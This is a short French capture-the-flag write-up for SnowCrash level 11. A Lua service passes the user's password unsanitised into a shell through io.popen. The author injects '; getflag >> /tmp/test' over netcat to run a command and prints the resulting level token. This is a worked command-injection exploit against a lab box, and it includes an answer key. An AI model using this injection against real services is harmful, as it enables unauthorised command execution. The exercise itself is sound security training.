On commance avec un fichier `level11.lua` qui contient du code qui va comparer le hash d'un mot de passe donné en entré avec un autre hash contenu dans le fichier.

Ce hash semble être obtenu via la fonction sha1. En decryptant le hash en sha1, on obtient `NotSoEasy` qui ne permet pas de débloquer quoi que ce soit.

En cherchant une autre piste, on s'est intéressés à cette ligne :
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Ici, `..pass..` correspond à une syntaxe de substitution en lua, cette partie sera remplacée par le paramètre `pass`.

On a donc voulu voir s'il était possible d'envoyer un caractère interprétable par le shell en paramètre pour pouvoir lui faire exécuter une autre commande (en l'occurence getflag) :

```bash
level11@SnowCrash:~$ echo '; getflag >> /tmp/test' | nc localhost 5151
Password: Erf nope.
```

Puis on cat le fichier test pour voir si ça a marché :

```bash
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
